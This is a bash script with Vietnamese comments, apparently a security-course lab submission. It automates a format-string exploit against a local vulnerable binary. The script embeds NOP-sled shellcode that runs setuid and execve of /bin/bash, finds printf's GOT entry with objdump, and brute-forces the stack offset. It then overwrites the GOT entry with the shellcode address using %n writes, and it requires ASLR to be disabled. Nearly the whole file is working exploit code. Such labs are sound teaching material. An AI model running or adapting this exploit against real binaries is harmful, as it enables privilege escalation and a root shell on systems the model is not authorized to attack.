
# Chuyen dia chi thanh nguoc lai
convertLittleEndian(){
  #$1 = dia chi
# chuyen 2 dia chi luon 1 luc
  # tim dia chi + 2
# Khoi tao 2 dia chi
# tim for dao 2 dia chi
  addr1=$1
  addr2=$(printf "%x" $((0x$addr1 + 0x2)) )
  inverAddr1=
  inverAddr2=
  for i in `seq 0 2 6`
  do
   inverAddr1=\\x${addr1:$i:2}$inverAddr1 
   inverAddr2=\\x${addr2:$i:2}$inverAddr2
  done
  echo $inverAddr1$inverAddr2

}


getColVal(){
# $1 = string needed to be filter
# $2 = column
  col=$2
  res=$(echo "$1" | grep printf | sed  's/\|/ /'  | awk '{print $1}')
  echo "$res"

}

# chuyen cac nua addr thanh int
getIntHalfAddr(){
  local firstHalf=${1:4}
  local secondHalf=${1:0:4}
  oriFirstHalf=$((16#$firstHalf))
  if (( $((16#$secondHalf)) < $oriFirstHalf))
  then
    secondHalf=1$secondHalf
  fi
  oriSecondHalf=$((16#$secondHalf - oriFirstHalf))

}

# tim control address
findCtrlAddr(){
 # dua ra 2 ket qua, trong do co $adj la dau . 
 local egg='AAAABBBB'
 stop="false"
 tmpAdj=
 for j in `seq 1 4`
 do
   for i in `seq 1 300`
   do
    input=%${1}u.%$i\$x.%${2}u.%$((i+1))\$x.$egg$tmpAdj
    #echo "$input"
    tmp=$(./$target "$input")
    if [[ $tmp == *"42424242"* && $tmp == *"41414141"* ]]
    then
      stop=true
      offset=$i
      break
    fi
   done 
   if [[ $stop == "true" ]]
   then
    break
   fi
   tmpAdj=.$tmpAdj
 done
 adj=$tmpAdj
 # for 1 300
 # if output chua 4141414142424242
#   offset=i; break
#else them 1 cham vao adj
}




# - Tao shellcode
# Noi ve cac null byte: shellcode nay len tren mang
checkASRL=$(cat /proc/sys/kernel/randomize_va_space )
if [[ $checkASRL == 0 ]]
then
  target=$1
  ls $target > /dev/null 2> /dev/null
  if [[ $? != 0 ]]
  then
    echo "Please specifying a correct binary name"
    exit
  fi
  ls getEnv > /dev/null 2> /dev/null
  if [[ $? != 0 ]]
  then
    gcc getEnv.c -o getEnv
  fi
  export SHELLCODE=$(python -c 'print "\x90" * 500 + "\xeb\x20\x31\xc0\xb0\x17\x31\xdb\xcd\x80\x89\xd8\x5b\x88\x43\x09\xb0\x0b\x89\x5b\x0a\x31\xc9\x89\x4b\x0e\x8d\x4b\x0a\x8d\x53\x0e\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"')
# Lay dia chi cua shellcode; Nho submit ca file getEnv.c theo nua; giai thich hoat dong cua getEnv
  shellAddr=$(./getEnv SHELLCODE s)
  echo "Get address of SHELLCODE:" $shellAddr
# Tim dia chi printf; Lay cot 1 cua objdump
  printfAddr=$(getColVal "$(objdump --dynamic-reloc $target)" 1)
  echo "Get address of printf:" echo $printfAddr
# Tim so byte can them vao de viet ra duoc dia chi $shellcode
#oriFirstHalf=$(getIntHalfAddr $shellAddr 1)
##oriSecondHalf=$(( $(getIntHalfAddr $shellAddr 2) - oriFirstHalf))
#oriSecondHalf=$(getAmountByteSecondHalf oriFirstHalf)
  oriFirstHalf=
  oriSecondHalf=
  getIntHalfAddr $shellAddr

#echo Origin secondhalf: $oriSecondHalf
  realSecondHalf=$((oriSecondHalf - 1))
  realFirstHalf=$((oriFirstHalf - 2))
# Tim dia chi ma minh co the kiem soat
  findCtrlAddr $realFirstHalf $realSecondHalf
#offset=149
#adj=..
# exploit
  if [[ $printfAddr != "0804a000" ]]
  then
    egg=$(convertLittleEndian $printfAddr)
    EGG=$(printf "$egg")$adj
    ./$target "%${realFirstHalf}u.%$offset\$n.%${realSecondHalf}u.%$((offset+1))\$n.$EGG"
  else
# Truong hop trong address co null byte
    egg='\xa0\x04\x08\x02\xa0\x04\x08'
    EGG=$(printf "$egg")$adj
    ./$target "%${realFirstHalf}u.%$offset\$n.%${realSecondHalf}u.%$((offset+1))\$n." "$EGG"
    echo "%${realFirstHalf}u.%$offset\$n.%${realSecondHalf}u.%$((offset+1))\$n." "$EGG"
  fi

#  echo realFirst= $realFirstHalf
#  echo realSecond= $realSecondHalf
#  echo offset o day: $offset
#  echo adj la $adj
#  echo day la shelladre $shellAddr
else
  echo "Please turn off ASLR before running the attack"
fi
#test 
#getColVal "$(objdump --dynamic-reloc s)" 1
#findCtrlAddr 11111 11111
#getIntHalfAddr bffffb87 2
#convertLittleEndian 0804a000



